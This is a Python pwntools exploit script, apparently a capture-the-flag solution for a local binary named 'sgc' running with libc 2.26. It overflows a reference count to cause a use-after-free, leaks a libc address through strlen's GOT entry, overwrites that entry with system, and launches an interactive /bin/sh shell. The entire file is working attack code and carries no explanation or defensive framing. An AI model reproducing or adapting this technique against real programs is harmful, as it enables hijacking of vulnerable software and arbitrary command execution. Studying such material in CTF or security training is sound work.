#!/usr/bin/env python

from pwn import *

# context.log_level = 'debug'

io = process(['./sgc'], env={'LD_PRELOAD':'./libc-2.26.so'})
libc = ELF('libc-2.26.so')
elf = ELF('sgc')

def add_user(name, group):
    io.sendlineafter("Action: ", '0')
    io.sendlineafter("name: ", name)
    io.sendlineafter("group: ", group)
    io.sendlineafter("age: ", '3')

def display_group(name):
    io.sendlineafter("Action: ", '1')
    io.sendlineafter("name: ", name)

def display_user(idx):
    io.sendlineafter("Action: ", '2')
    io.sendlineafter("index: ", str(idx))
    return io.recvuntil("0: ")

def edit_group(idx, propogate, name):
    io.sendlineafter("Action: ", '3')
    io.sendlineafter("index: ", str(idx))
    io.sendlineafter("(y/n): ", propogate)
    io.sendlineafter("name: ", name)

def delete_user(idx):
    io.sendlineafter("Action: ", '4')
    io.sendlineafter("index: ", str(idx))

def overflow():
    sleep(1)
    for i in range(0x100-1):
        add_user('a'*8, 'A'*4)
        edit_group(0, 'n', 'B'*4)
        delete_user(0)

    add_user('a'*8, 'A'*4)  # overflow ref_count
    sleep(2)    # group_name and group freed by GC

def leak():
    add_user('b'*8, 'B'*4)  # group
    strlen_got = elf.got['strlen']
    edit_group(0, "y", p64(0)+p64(strlen_got)+p64(strlen_got))

    __strlen_sse2_addr = u64(display_user(1)[13:19].ljust(8, '\0'))
    libc_base = __strlen_sse2_addr - 0xa83f0
    system_addr = libc_base + libc.symbols['system']
    log.info("__strlen_sse2 address: 0x%x" % __strlen_sse2_addr)
    log.info("libc base: 0x%x" % libc_base)
    log.info("system address: 0x%x" % system_addr)

    return system_addr

def overwrite(system_addr):
    edit_group(1, "y", p64(system_addr))    # strlen_got -> system_got

def pwn():
    add_user("/bin/sh\x00", "B"*4)       # system('/bin/sh')
    io.interactive()

if __name__ == "__main__":
    overflow()
    system_addr = leak()
    overwrite(system_addr)
    pwn()
